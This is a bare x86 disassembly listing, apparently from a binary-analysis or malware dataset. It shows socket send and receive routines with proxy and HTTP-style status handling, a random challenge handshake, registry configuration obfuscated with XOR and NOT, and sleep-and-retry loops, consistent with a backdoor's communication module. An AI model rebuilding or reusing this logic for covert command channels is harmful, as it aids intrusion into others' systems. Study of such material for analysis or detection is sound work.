call sub_100012a2
push ebx
lea ecx [ ebp - 0x44 ]
lea edx [ ebp - 0x15 ]
call sub_100012a2
push ebx
lea ecx [ ebp - 0x3c ]
lea edx [ ebp - 0xe ]
call sub_100012a2
push ebx
lea ecx [ ebp - 0x64 ]
lea edx [ ebp - 0x34 ]
call sub_100012a2
push ebx
lea ecx [ ebp - 0x5c ]
lea edx [ ebp - 0x2d ]
call sub_100012a2
push ebx
lea ecx [ ebp - 0x54 ]
lea edx [ ebp - 0x26 ]
call sub_100012a2
mov edi [ strlen@IAT ]
mov ebx r--data
push ebx
call edi
push ebx
mov [ ebp - 0x68 ] eax
call edi
add esp 0x40
push [ ebp - 0x88 ]
mov ebx eax
mov [ ebp - 0x78 ] ebx
call edi
mov ecx [ ebp - 0x68 ]
add ecx 0x40
mov [ ebp - 0x6c ] eax
lea edx [ ecx + eax ]
lea edi [ edx + ebx ]
mov [ ebp - 0x74 ] ebx
sar [ ebp - 0x74 ] 0x8
mov [ ebp - 0x70 ] ebx
mov ebx [ ebp - 0x6c ]
lea eax [ edi + 0x18 ]
sar ebx 0x8
mov [ ebp - 0x94 ] eax
mov eax 0xff
and [ ebp - 0x70 ] eax
mov [ ebp - 0x84 ] ebx
mov ebx [ ebp - 0x6c ]
and ebx eax
push esi
push esi
push 0x2
push 0x2
push esi
push esi
push esi
push esi
push esi
push esi
push esi
push esi
mov [ ebp - 0x80 ] ebx
mov ebx [ ebp - 0x68 ]
sar ebx 0x8
mov [ ebp - 0x7c ] ebx
mov ebx [ ebp - 0x68 ]
and ebx eax
mov [ ebp - 0x8c ] ebx
mov ebx edx
and edx eax
sar ebx 0x8
push ebx
push edx
push [ ebp - 0x74 ]
mov edx ecx
push [ ebp - 0x70 ]
sar edx 0x8
push [ ebp - 0x74 ]
and ecx eax
push [ ebp - 0x70 ]
push esi
push esi
push edx
push ecx
push [ ebp - 0x84 ]
mov ecx [ ebp - 0x94 ]
push [ ebp - 0x80 ]
mov edx ecx
push [ ebp - 0x84 ]
sar edx 0x8
push [ ebp - 0x80 ]
and ecx eax
push esi
push esi
push esi
push 0x40
push [ ebp - 0x7c ]
push [ ebp - 0x8c ]
push [ ebp - 0x7c ]
push [ ebp - 0x8c ]
push esi
push esi
push edx
push ecx
push esi
push 0x18
pop ecx
push ecx
push esi
push ecx
push esi
push esi
mov edx edi
sar edx 0x8
push edx
and edi eax
push edi
mov edi [ ebp - 0x90 ]
push esi
push ecx
push esi
push ecx
push esi
push esi
push esi
push 0x3
push esi
push r--data
push 0x400
push edi
call [ _snprintf@IAT ]
mov ebx eax
add esp 0xec
cmp ebx esi
jl r-xdata
mov ecx [ ebp - 0x4 ]
pop edi
pop esi
xor ecx ebp
pop ebx
call sub_1000eff2
leave
retn
mov eax [ ebp - 0x6c ]
lea ecx [ ebx + eax ]
add ecx [ ebp - 0x78 ]
mov eax [ ebp - 0x68 ]
lea ecx [ ecx + eax + 0x30 ]
cmp ecx 0x400
jb r-xdata
mov esi [ memcpy@IAT ]
push eax
lea eax [ edi + ebx ]
push r--data
push eax
call esi
push [ ebp - 0x6c ]
add ebx [ ebp - 0x68 ]
push [ ebp - 0x88 ]
lea eax [ edi + ebx ]
push eax
call esi
push [ ebp - 0x78 ]
add ebx [ ebp - 0x6c ]
push r--data
lea eax [ edi + ebx ]
push eax
call esi
add ebx [ ebp - 0x78 ]
push 0x18
lea eax [ ebp - 0x4c ]
push eax
lea eax [ edi + ebx ]
push eax
call esi
push 0x18
lea eax [ ebp - 0x64 ]
push eax
lea eax [ edi + ebx + 0x18 ]
push eax
call esi
add ebx 0x30
mov eax ebx
add esp 0x3c
sar eax 0x8
mov [ edi + 0x39 ] al
mov [ edi + 0x38 ] bl
mov eax ebx
or eax 0xffffffff
jmp r-xdata
sub_100069c4
push ebp
mov ebp esp
sub esp 0xd2c
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0x8 ]
push esi
mov esi [ ebp + 0x14 ]
push edi
mov [ ebp - 0xd20 ] ecx
mov ecx [ ebp + 0x10 ]
mov edi edx
mov [ ebp - 0x8 ] eax
push eax
mov eax [ ebp + 0xc ]
mov [ ebp - 0xd10 ] edi
mov [ ebp - 0xd28 ] ecx
mov [ ebp - 0xd1c ] esi
call sub_1000625e
mov [ ebp - 0xd14 ] eax
test eax eax
je r-xdata
mov ecx [ ebp - 0x4 ]
pop edi
xor ecx ebp
pop esi
call sub_1000eff2
leave
retn 0x14
push ebx
push 0x100
lea eax [ edi + 0x8 ]
push esi
push eax
call [ strncpy@IAT ]
mov eax [ ebp + 0x18 ]
push eax
push esi
push eax
push esi
push r--data
mov [ edi + 0x108 ] eax
mov ebx 0x400
lea eax [ ebp - 0x40c ]
push ebx
push eax
mov [ edi + 0x107 ] 0x0
call [ _snprintf@IAT ]
mov esi [ strlen@IAT ]
add esp 0x28
lea eax [ ebp - 0x40c ]
push 0x0
push eax
call esi
pop ecx
push eax
lea eax [ ebp - 0x40c ]
push eax
push [ ebp - 0xd14 ]
call [ send@IAT ]
mov edi eax
lea eax [ ebp - 0x40c ]
push eax
call esi
pop ecx
cmp edi eax
jne r-xdata
call [ GetLastError@IAT ]
mov ecx [ ebp - 0xd10 ]
mov [ ecx + 0x4 ] eax
push 0x0
push ebx
lea eax [ ebp - 0x40c ]
push eax
push [ ebp - 0xd14 ]
call [ recv@IAT ]
test eax eax
jle r-xdata
call [ closesocket@IAT ]
jmp r-xdata
lea eax [ ebp - 0x40c ]
push eax
mov [ ebp - 0xd ] 0x0
call esi
pop ecx
cmp eax 0xf
jb r-xdata
xor eax eax
mov eax [ ebp - 0xd10 ]
mov [ eax + 0x4 ] 0xd
jmp r-xdata
mov edi [ strncmp@IAT ]
push 0x9
lea eax [ ebp - 0x40c ]
push r--data
push eax
call edi
add esp 0xc
test eax eax
je r-xdata
push [ ebp - 0xd14 ]
jmp r-xdata
lea eax [ ebp - 0x403 ]
push eax
call [ atoi@IAT ]
pop ecx
test eax eax
jne r-xdata
push 0x9
lea eax [ ebp - 0x40c ]
push r--data
push eax
call edi
add esp 0xc
test eax eax
jne r-xdata
cmp eax 0xc8
jne r-xdata
push [ ebp - 0xd14 ]
cmp eax 0x197
je r-xdata
mov ecx [ ebp - 0xd10 ]
mov eax [ ebp - 0xd14 ]
mov [ ecx + 0x10c ] eax
jmp r-xdata
call [ closesocket@IAT ]
and [ ebp - 0xd2c ] 0x0
and [ ebp - 0xd24 ] 0x0
mov edi r--data
lea eax [ ebp - 0x40c ]
push edi
push eax
call [ strstr@IAT ]
pop ecx
pop ecx
mov [ ebp - 0xd18 ] eax
test eax eax
je r-xdata
mov eax [ ebp - 0xd10 ]
mov [ eax + 0x4 ] 0xd
jmp r-xdata
pop ebx
mov eax [ ebp - 0xd10 ]
mov [ eax + 0x4 ] 0xd
push 0x5
push r--data
push edi
call esi
add eax [ ebp - 0xd18 ]
pop ecx
push eax
call [ _strnicmp@IAT ]
add esp 0xc
test eax eax
jne r-xdata
push 0x9
push r--data
push edi
call esi
add eax [ ebp - 0xd18 ]
pop ecx
push eax
call [ _strnicmp@IAT ]
add esp 0xc
test eax eax
jne r-xdata
mov [ ebp - 0xd2c ] 0x1
jmp r-xdata
mov eax [ ebp - 0xd18 ]
inc eax
push edi
push eax
call [ strstr@IAT ]
pop ecx
pop ecx
mov [ ebp - 0xd18 ] eax
test eax eax
jne r-xdata
mov [ ebp - 0xd24 ] 0x1
cmp [ ebp - 0xd2c ] eax
je r-xdata
cmp [ ebp - 0xd24 ] 0x0
je r-xdata
mov eax [ ebp - 0xd20 ]
test eax eax
je r-xdata
mov eax [ ebp - 0xd20 ]
test eax eax
je r-xdata
mov eax [ ebp - 0xd10 ]
mov [ eax + 0x4 ] 0x4dc
cmp [ eax ] 0x0
je r-xdata
cmp [ eax ] 0x0
je r-xdata
push [ ebp - 0x8 ]
mov eax [ ebp + 0xc ]
mov edi [ ebp - 0xd10 ]
call sub_1000625e
mov [ ebp - 0xd14 ] eax
test eax eax
je r-xdata
push [ ebp - 0x8 ]
mov eax [ ebp + 0xc ]
mov edi [ ebp - 0xd10 ]
call sub_1000625e
mov [ ebp - 0xd14 ] eax
test eax eax
je r-xdata
push [ ebp - 0xd28 ]
mov edi [ _snprintf@IAT ]
push [ ebp - 0xd20 ]
lea eax [ ebp - 0x48c ]
push r--data
push 0x80
push eax
call edi
add esp 0x14
lea eax [ ebp - 0x50c ]
push eax
lea eax [ ebp - 0x48c ]
push eax
mov [ ebp - 0x40d ] 0x0
call esi
pop ecx
lea ecx [ ebp - 0x48c ]
call sub_100050c6
lea eax [ ebp - 0x50c ]
push eax
push [ ebp + 0x18 ]
lea eax [ ebp - 0x40c ]
push [ ebp - 0xd1c ]
push [ ebp + 0x18 ]
push [ ebp - 0xd1c ]
push r--data
push ebx
push eax
call edi
add esp 0x24
lea eax [ ebp - 0x40c ]
push 0x0
push eax
call esi
pop ecx
push eax
lea eax [ ebp - 0x40c ]
push eax
push [ ebp - 0xd14 ]
call [ send@IAT ]
mov edi eax
lea eax [ ebp - 0x40c ]
push eax
call esi
pop ecx
cmp edi eax
je r-xdata
lea eax [ ebp - 0x90c ]
push eax
call sub_100066d4
lea ecx [ ebp - 0xd0c ]
push ecx
lea ecx [ ebp - 0x90c ]
call sub_100050c6
lea eax [ ebp - 0xd0c ]
push eax
push [ ebp + 0x18 ]
mov edi r--data
push [ ebp - 0xd1c ]
lea eax [ ebp - 0x40c ]
push [ ebp + 0x18 ]
push [ ebp - 0xd1c ]
push edi
push ebx
push eax
call [ _snprintf@IAT ]
add esp 0x28
lea eax [ ebp - 0x40c ]
push 0x0
push eax
call esi
pop ecx
push eax
lea eax [ ebp - 0x40c ]
push eax
push [ ebp - 0xd14 ]
call [ send@IAT ]
cmp eax 0xffffffff
jne r-xdata
mov edi [ ebp - 0xd14 ]
push 0x0
push ebx
lea eax [ ebp - 0x40c ]
push eax
push edi
call [ recv@IAT ]
test eax eax
jg r-xdata
push 0x0
push ebx
lea eax [ ebp - 0x40c ]
push eax
push [ ebp - 0xd14 ]
call [ recv@IAT ]
test eax eax
jle r-xdata
call [ GetLastError@IAT ]
mov ecx [ ebp - 0xd10 ]
mov [ ecx + 0x4 ] eax
jmp r-xdata
lea eax [ ebp - 0x40c ]
push eax
mov [ ebp - 0xd ] 0x0
call esi
pop ecx
cmp eax 0xf
jb r-xdata
call [ GetLastError@IAT ]
mov ecx [ ebp - 0xd10 ]
mov [ ecx + 0x4 ] eax
jmp r-xdata
lea eax [ ebp - 0x40c ]
push r--data
push eax
mov [ ebp - 0xd ] 0x0
call [ strstr@IAT ]
pop ecx
pop ecx
mov [ ebp - 0xd18 ] eax
test eax eax
je r-xdata
xor esi esi
mov eax [ ebp - 0xd10 ]
mov [ eax + 0x4 ] 0xd
mov esi [ strncmp@IAT ]
push 0x9
lea eax [ ebp - 0x40c ]
push r--data
push eax
call esi
add esp 0xc
test eax eax
je r-xdata
push edi
push r--data
push eax
call [ strstr@IAT ]
pop ecx
pop ecx
test eax eax
je r-xdata
lea eax [ ebp - 0x403 ]
push eax
call [ atoi@IAT ]
pop ecx
test eax eax
jne r-xdata
push 0x9
lea eax [ ebp - 0x40c ]
push r--data
push eax
call esi
add esp 0xc
test eax eax
je r-xdata
push r--data
call esi
add [ ebp - 0xd18 ] eax
mov [ esp ] r--data
push [ ebp - 0xd18 ]
call [ strstr@IAT ]
lea eax [ ebp - 0x90c ]
push eax
mov eax [ ebp - 0xd18 ]
call sub_100051b5
lea eax [ ebp - 0x90c ]
push r--data
push eax
call [ strcmp@IAT ]
add esp 0x14
test eax eax
jne r-xdata
cmp eax 0xc8
mov eax [ ebp - 0xd10 ]
je r-xdata
cmp [ ebp - 0x904 ] 0x2
jne r-xdata
mov [ eax + 0x10c ] edi
mov eax edi
jmp r-xdata
mov [ eax + 0x4 ] 0x4dc
mov esi edi
jmp r-xdata
push 0x8
lea eax [ ebp - 0x8f4 ]
push eax
lea eax [ ebp - 0xc ]
push eax
call [ memcpy@IAT ]
mov ecx [ ebp - 0xd28 ]
add esp 0xc
push [ ebp - 0xd20 ]
lea eax [ ebp - 0x90c ]
push eax
lea edx [ ebp - 0xc ]
call sub_10006771
lea ecx [ ebp - 0xd0c ]
push ecx
lea ecx [ ebp - 0x90c ]
call sub_100050c6
lea eax [ ebp - 0xd0c ]
push eax
push [ ebp + 0x18 ]
lea eax [ ebp - 0x40c ]
push [ ebp - 0xd1c ]
push [ ebp + 0x18 ]
push [ ebp - 0xd1c ]
push edi
push ebx
push eax
call [ _snprintf@IAT ]
add esp 0x2c
lea eax [ ebp - 0x40c ]
push 0x0
push eax
call esi
mov edi [ ebp - 0xd14 ]
pop ecx
push eax
lea eax [ ebp - 0x40c ]
push eax
push edi
call [ send@IAT ]
cmp eax 0xffffffff
je r-xdata
push [ ebp - 0xd14 ]
call [ closesocket@IAT ]
mov eax esi
jmp r-xdata
push 0x0
push ebx
lea eax [ ebp - 0x40c ]
push eax
push edi
call [ recv@IAT ]
test eax eax
jle r-xdata
lea eax [ ebp - 0x40c ]
push eax
mov [ ebp - 0xd ] 0x0
call esi
pop ecx
cmp eax 0xf
jb r-xdata
mov esi [ strncmp@IAT ]
push 0x9
lea eax [ ebp - 0x40c ]
push r--data
push eax
call esi
add esp 0xc
test eax eax
je r-xdata
lea eax [ ebp - 0x403 ]
push eax
call [ atoi@IAT ]
pop ecx
test eax eax
je r-xdata
push 0x9
lea eax [ ebp - 0x40c ]
push r--data
push eax
call esi
add esp 0xc
test eax eax
jne r-xdata
cmp eax 0xc8
mov eax [ ebp - 0xd10 ]
je r-xdata
mov [ eax + 0x4 ] 0x4dc
jmp r-xdata
sub_100070bc
push ebp
mov ebp esp
sub esp 0x44
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0x8 ]
push esi
push edi
push eax
mov eax [ ebp + 0xc ]
mov edi ecx
call sub_1000625e
mov esi eax
test esi esi
je r-xdata
mov ecx [ ebp - 0x4 ]
pop edi
xor ecx ebp
pop esi
call sub_1000eff2
leave
retn 0x8
push ebx
xor ebx ebx
call [ rand@IAT ]
mov [ ebp + ebx * 4 - 0x44 ] eax
inc ebx
cmp ebx 0x10
jb r-xdata
mov eax [ ebp - 0x44 ]
push 0x0
push 0x40
mov ecx eax
ror eax 0x7
pop ebx
mov [ ebp - 0x3c ] eax
push ebx
lea eax [ ebp - 0x44 ]
push eax
not ecx
push esi
mov [ ebp - 0x40 ] ecx
call [ send@IAT ]
cmp eax ebx
jne r-xdata
push esi
call [ closesocket@IAT ]
xor eax eax
push 0x7d0
mov ecx esi
call sub_10005f68
pop ecx
test eax eax
jle r-xdata
push 0x0
push ebx
lea eax [ ebp - 0x44 ]
push eax
push esi
call [ recv@IAT ]
cmp eax ebx
je r-xdata
mov eax [ ebp - 0x44 ]
mov ecx eax
not ecx
cmp [ ebp - 0x40 ] ecx
jne r-xdata
call [ GetLastError@IAT ]
mov [ edi + 0x4 ] eax
jmp r-xdata
mov [ edi + 0x4 ] 0xd
ror eax 0x7
cmp [ ebp - 0x3c ] eax
jne r-xdata
mov [ edi + 0x10c ] esi
mov eax esi
jmp r-xdata
pop ebx
sub_1000718b
push ebp
mov ebp esp
sub esp 0x40c
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0xc ]
push esi
mov esi [ ebp + 0x8 ]
push edi
push esi
mov edi ecx
mov [ ebp - 0x40c ] ecx
call sub_1000625e
mov [ ebp - 0x408 ] eax
test eax eax
je r-xdata
mov ecx [ ebp - 0x4 ]
pop edi
xor ecx ebp
pop esi
call sub_1000eff2
leave
retn 0x8
push ebx
push [ ebp + 0xc ]
mov edi 0x400
push esi
push r--data
lea eax [ ebp - 0x404 ]
push edi
push eax
call [ _snprintf@IAT ]
mov esi [ strlen@IAT ]
add esp 0x14
lea eax [ ebp - 0x404 ]
push 0x0
push eax
call esi
pop ecx
push eax
lea eax [ ebp - 0x404 ]
push eax
push [ ebp - 0x408 ]
call [ send@IAT ]
mov ebx eax
lea eax [ ebp - 0x404 ]
push eax
call esi
pop ecx
cmp ebx eax
jne r-xdata
push [ ebp - 0x408 ]
jmp r-xdata
mov ebx [ ebp - 0x408 ]
push 0x2710
mov ecx ebx
call sub_10005f68
pop ecx
test eax eax
jg r-xdata
call [ closesocket@IAT ]
xor eax eax
jmp r-xdata
push 0x0
push edi
lea eax [ ebp - 0x404 ]
push eax
push ebx
call [ recv@IAT ]
test eax eax
jle r-xdata
mov eax [ ebp - 0x40c ]
push [ eax + 0x10c ]
jmp r-xdata
pop ebx
push ebx
mov edi r--data
push edi
mov [ ebp - 0x5 ] 0x0
call esi
push eax
push edi
mov edi [ strncmp@IAT ]
lea eax [ ebp - 0x404 ]
push eax
call edi
add esp 0x10
test eax eax
je r-xdata
lea eax [ ebp - 0x404 ]
push r--data
push eax
call [ strstr@IAT ]
pop ecx
pop ecx
test eax eax
je r-xdata
mov ebx r--data
push ebx
call esi
push eax
lea eax [ ebp - 0x404 ]
push ebx
push eax
call edi
add esp 0x10
test eax eax
je r-xdata
mov eax [ ebp - 0x40c ]
mov [ eax + 0x10c ] ebx
mov eax ebx
mov ebx [ ebp - 0x408 ]
sub_100072e0
push ebp
mov ebp esp
sub esp 0x44
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0x8 ]
mov edx [ ebp + 0x10 ]
push esi
mov esi [ ebp + 0x1c ]
push edi
push [ ebp + 0xc ]
mov edi ecx
mov ecx [ ebp + 0x18 ]
push eax
push esi
push [ ebp + 0x14 ]
push edx
mov edx edi
call sub_100069c4
mov esi eax
test esi esi
je r-xdata
mov ecx [ ebp - 0x4 ]
pop edi
xor ecx ebp
pop esi
call sub_1000eff2
leave
retn 0x18
push ebx
xor ebx ebx
call [ rand@IAT ]
mov [ ebp + ebx * 4 - 0x44 ] eax
inc ebx
cmp ebx 0x10
jb r-xdata
mov eax [ ebp - 0x44 ]
push 0x0
push 0x40
mov ecx eax
ror eax 0x7
pop ebx
mov [ ebp - 0x3c ] eax
push ebx
lea eax [ ebp - 0x44 ]
push eax
not ecx
push esi
mov [ ebp - 0x40 ] ecx
call [ send@IAT ]
cmp eax ebx
jne r-xdata
push esi
call [ closesocket@IAT ]
xor eax eax
push 0x7d0
mov ecx esi
call sub_10005f68
pop ecx
test eax eax
jle r-xdata
push 0x0
push ebx
lea eax [ ebp - 0x44 ]
push eax
push esi
call [ recv@IAT ]
cmp eax ebx
je r-xdata
mov eax [ ebp - 0x44 ]
mov ecx eax
not ecx
cmp [ ebp - 0x40 ] ecx
jne r-xdata
call [ GetLastError@IAT ]
mov [ edi + 0x4 ] eax
jmp r-xdata
mov [ edi + 0x4 ] 0xd
ror eax 0x7
cmp [ ebp - 0x3c ] eax
jne r-xdata
mov [ edi + 0x10c ] esi
mov eax esi
jmp r-xdata
pop ebx
sub_100073bf
push ebp
mov ebp esp
sub esp 0x10
push ebx
push esi
mov esi [ RegOpenKeyExW@IAT ]
push edi
lea eax [ ebp - 0x8 ]
push eax
push 0x1
xor ebx ebx
push ebx
mov edi r--data
push edi
push 0x80000002
mov [ ebp - 0x10 ] ebx
call esi
cmp eax ebx
je r-xdata
mov esi [ RegQueryValueExW@IAT ]
lea eax [ ebp - 0x4 ]
push eax
push ebx
lea eax [ ebp - 0xc ]
push eax
push ebx
mov edi r--data
push edi
push [ ebp - 0x8 ]
mov [ ebp - 0x4 ] ebx
call esi
test eax eax
jne r-xdata
lea eax [ ebp - 0x8 ]
push eax
push 0x1
push ebx
push edi
push 0x80000001
call esi
cmp eax ebx
jne r-xdata
push [ ebp - 0x8 ]
call [ RegCloseKey@IAT ]
cmp [ ebp - 0xc ] 0x3
jne r-xdata
mov eax [ ebp - 0x10 ]
pop edi
pop esi
pop ebx
leave
retn
mov eax [ ebp - 0x4 ]
mov ecx [ ebp + 0xc ]
push eax
mov [ ecx ] eax
call [ malloc@IAT ]
pop ecx
mov ecx [ ebp + 0x8 ]
mov [ ecx ] eax
lea ecx [ ebp - 0x4 ]
push ecx
push eax
lea eax [ ebp - 0xc ]
push eax
push ebx
push edi
push [ ebp - 0x8 ]
call esi
test eax eax
jne r-xdata
mov eax [ ebp + 0x8 ]
push [ eax ]
call [ free@IAT ]
pop ecx
cmp [ ebp - 0x4 ] ebx
jbe r-xdata
mov [ ebp - 0x10 ] 0x1
jmp r-xdata
mov ecx [ ebp + 0x8 ]
mov ecx [ ecx ]
mov dl [ ecx + eax ]
xor dl 0x5f
not dl
mov [ ecx + eax ] dl
inc eax
cmp eax [ ebp - 0x4 ]
jb r-xdata
sub_10007494
push ebp
mov ebp esp
sub esp 0xc
and [ ebp - 0xc ] 0x0
push ebx
mov ebx 0xc4
push ebx
call [ malloc@IAT ]
pop ecx
mov [ ebp - 0x8 ] eax
test eax eax
je r-xdata
mov eax [ ebp - 0xc ]
pop ebx
leave
retn
push esi
mov esi [ ebp + 0x8 ]
push edi
sub esi eax
mov edi ebx
mov cl [ esi + eax ]
xor cl 0x5f
not cl
mov [ eax ] cl
inc eax
dec edi
jne r-xdata
mov esi [ RegOpenKeyExW@IAT ]
lea eax [ ebp - 0x4 ]
push eax
push 0x2
push edi
mov edi r--data
push edi
push 0x80000002
call esi
test eax eax
je r-xdata
push ebx
push [ ebp - 0x8 ]
push 0x3
push 0x0
push r--data
push [ ebp - 0x4 ]
call [ RegSetValueExW@IAT ]
test eax eax
jne r-xdata
lea eax [ ebp - 0x4 ]
push eax
push 0x2
push 0x0
push edi
push 0x80000001
call esi
test eax eax
jne r-xdata
push [ ebp - 0x8 ]
call [ free@IAT ]
pop ecx
pop edi
pop esi
mov [ ebp - 0xc ] 0x1
sub_1000752f
push ebp
mov ebp esp
mov eax 0x1894
call sub_1000faf0
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0x8 ]
push esi
push [ ebp + 0xc ]
mov esi ecx
mov edx [ esi ]
push eax
mov [ ebp - 0x1890 ] eax
call [ edx + 0x14 ]
test eax eax
je r-xdata
push ebx
mov ebx [ Sleep@IAT ]
push edi
mov edi 0x1388
push edi
call ebx
push [ ebp + 0xc ]
mov eax [ esi ]
push [ ebp - 0x1890 ]
mov ecx esi
call [ eax + 0x10 ]
mov [ ebp - 0x188c ] eax
test eax eax
je r-xdata
mov [ esi + 0x114 ] 0x30
jmp r-xdata
push edi
call ebx
and [ ebp - 0x1888 ] 0x0
lea eax [ ebp - 0x1894 ]
push eax
lea eax [ ebp - 0x1888 ]
push eax
call sub_100073bf
pop ecx
pop ecx
test eax eax
je r-xdata
mov [ esi + 0x114 ] 0x20
jmp r-xdata
mov ecx [ ebp - 0x4 ]
xor ecx ebp
pop esi
call sub_1000eff2
leave
retn 0x8
lea eax [ ebp - 0x1884 ]
push eax
call sub_1000ddbe
pop ecx
mov [ ebp - 0x1894 ] eax
test eax eax
je r-xdata
cmp [ ebp - 0x1894 ] 0xc4
mov edi [ ebp - 0x1888 ]
jne r-xdata
pop edi
pop ebx
and [ ebp - 0x1888 ] 0x0
test eax eax
je r-xdata
push edi
call [ free@IAT ]
pop ecx
mov eax [ esi ]
lea ecx [ edi + 0x84 ]
push ecx
lea ecx [ edi + 0x44 ]
push ecx
push [ edi + 0x40 ]
mov ecx esi
push edi
push [ ebp + 0xc ]
push [ ebp - 0x1890 ]
call [ eax + 0x18 ]
mov [ ebp - 0x188c ] eax
test eax eax
je r-xdata
mov eax [ ebp - 0x188c ]
lea edi [ ebp - 0x1840 ]
push edi
call [ free@IAT ]
jmp r-xdata
mov eax [ ebp - 0x1888 ]
imul eax eax 0xc4
lea eax [ ebp + eax - 0x1884 ]
push eax
call sub_10007494
push 0x1388
call ebx
inc [ ebp - 0x1888 ]
mov eax [ ebp - 0x1888 ]
add edi 0xc4
cmp eax [ ebp - 0x1894 ]
jb r-xdata
mov [ esi + 0x114 ] 0x50
pop ecx
mov eax [ esi ]
lea ecx [ edi + 0x40 ]
push ecx
push edi
push [ edi - 0x4 ]
lea ecx [ edi - 0x44 ]
push ecx
push [ ebp + 0xc ]
mov ecx esi
push [ ebp - 0x1890 ]
call [ eax + 0x18 ]
mov [ ebp - 0x188c ] eax
test eax eax
jne r-xdata
jmp r-xdata
sub_100076c9
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
push esi
mov esi ecx
mov [ esi + 0x114 ] eax
cmp eax 0x10
je r-xdata
push [ ebp + 0x20 ]
mov eax [ esi ]
push [ ebp + 0x1c ]
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
call [ eax + 0x18 ]
test eax eax
je r-xdata
cmp eax 0x20
je r-xdata
push 0x1388
call [ Sleep@IAT ]
push [ ebp + 0x10 ]
mov eax [ esi ]
push [ ebp + 0xc ]
mov ecx esi
call [ eax + 0xc ]
mov [ esi + 0x114 ] 0x50
jmp r-xdata
push [ ebp + 0x10 ]
mov eax [ esi ]
push [ ebp + 0xc ]
call [ eax + 0x10 ]
jmp r-xdata
cmp eax 0x30
je r-xdata
pop esi
pop ebp
retn 0x1c
push [ ebp + 0x10 ]
mov eax [ esi ]
push [ ebp + 0xc ]
call [ eax + 0x14 ]
jmp r-xdata
cmp eax 0x50
je r-xdata
push [ ebp + 0x20 ]
mov eax [ esi ]
push [ ebp + 0x1c ]
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
call [ eax + 0x18 ]
jmp r-xdata
xor eax eax
jmp r-xdata
sub_10007767
push ebp
mov ebp esp
push ecx
push ebx
push esi
mov esi [ ebp + 0x10 ]
mov eax esi
shr eax 0x4
lea eax [ eax + esi + 0x5f ]
push edi
push eax
mov [ ebp - 0x4 ] ecx
call [ malloc@IAT ]
mov edi eax
xor ebx ebx
pop ecx
cmp edi ebx
jne r-xdata
mov eax [ ebp + 0x8 ]
mov [ edi + 0x4 ] eax
mov [ edi + 0x8 ] ebx
cmp [ rw-data ] ebx
jne r-xdata
or eax 0xffffffff
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov ecx [ ebp + 0xc ]
add eax 0x118
push eax
lea eax [ ebp + 0x10 ]
mov [ ebp + 0x10 ] ebx
push eax
lea ebx [ edi + 0x18 ]
push ebx
mov eax esi
call sub_1000ab5d
add esp 0xc
test eax eax
jne r-xdata
mov eax [ ebp - 0x4 ]
push 0x10000
add eax 0x118
push ebx
push eax
mov [ rw-data ] 0x1
call [ memset@IAT ]
add esp 0xc
pop edi
pop esi
pop ebx
leave
retn 0xc
and [ edi + 0x10 ] 0x0
push esi
push [ ebp + 0xc ]
push ebx
call [ memcpy@IAT ]
add esp 0xc
add esi 0x18
mov [ edi ] esi
mov eax [ ebp + 0x10 ]
cmp eax esi
jae r-xdata
push [ edi ]
mov esi [ ebp - 0x4 ]
push edi
call sub_100063f9
mov esi eax
test esi esi
jle r-xdata
mov ecx [ edi + 0xc ]
xor [ ebx ] ecx
mov ecx [ edi ]
sub ecx 0x15
inc eax
shr ecx 0x2
add ebx 0x4
cmp eax ecx
jb r-xdata
add eax 0x18
mov [ edi + 0x10 ] 0x1
mov [ edi + 0x14 ] esi
mov [ edi ] eax
jmp r-xdata
push edi
call [ free@IAT ]
pop ecx
mov eax esi
mov esi [ edi ]
mov esi [ rand@IAT ]
call esi
mov [ ebp + 0xc ] eax
shl [ ebp + 0xc ] 0x10
call esi
or eax [ ebp + 0xc ]
mov [ edi + 0xc ] eax
mov eax [ edi ]
sub eax 0x18
push eax
push ebx
call sub_10004b92
pop ecx
pop ecx
mov ecx [ edi ]
mov [ edi + 0x8 ] eax
sub ecx 0x15
xor eax eax
test ecx 0xfffffffc
jbe r-xdata
sub_1000788c
push ebp
mov ebp esp
sub esp 0xac
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0x8 ]
mov [ ebp - 0xa8 ] eax
mov eax [ ebp + 0xc ]
push esi
mov [ ebp - 0xa0 ] eax
mov eax [ ebp + 0x10 ]
push 0x18
mov esi ecx
mov [ ebp - 0xa4 ] eax
pop eax
lea ecx [ ebp - 0x9c ]
call sub_1000642a
test eax eax
jg r-xdata
push ebx
mov ebx [ ebp - 0x9c ]
cmp ebx 0x18
jae r-xdata
or eax 0xffffffff
jmp r-xdata
push edi
cmp ebx 0x6400000
jbe r-xdata
or eax 0xffffffff
jmp r-xdata
mov ecx [ ebp - 0x4 ]
xor ecx ebp
pop esi
call sub_1000eff2
leave
retn 0xc
push ebx
call [ malloc@IAT ]
mov edi eax
pop ecx
test edi edi
je r-xdata
push r--data
call [ OutputDebugStringA@IAT ]
mov edi [ ebp - 0x9c ]
add edi 0xffffffe8
je r-xdata
pop ebx
or eax 0xffffffff
push ebx
mov ebx [ memset@IAT ]
push 0x0
push edi
call ebx
mov eax [ ebp - 0x9c ]
add esp 0xc
add eax 0xffffffe8
mov ecx edi
call sub_1000642a
test eax eax
jg r-xdata
xor eax eax
jmp r-xdata
push 0x0
push 0x80
lea eax [ ebp - 0x84 ]
push eax
push [ esi + 0x10c ]
call [ recv@IAT ]
cmp eax 0xffffffff
je r-xdata
mov eax [ ebp - 0x9c ]
lea edx [ eax - 0x15 ]
xor ecx ecx
test edx 0xfffffffc
jbe r-xdata
push edi
call [ free@IAT ]
jmp r-xdata
pop edi
call [ GetLastError@IAT ]
mov [ esi + 0x4 ] eax
jmp r-xdata
test eax eax
je r-xdata
add eax 0xffffffe8
push eax
push edi
call sub_10004b92
pop ecx
pop ecx
cmp [ ebp - 0x94 ] eax
jne r-xdata
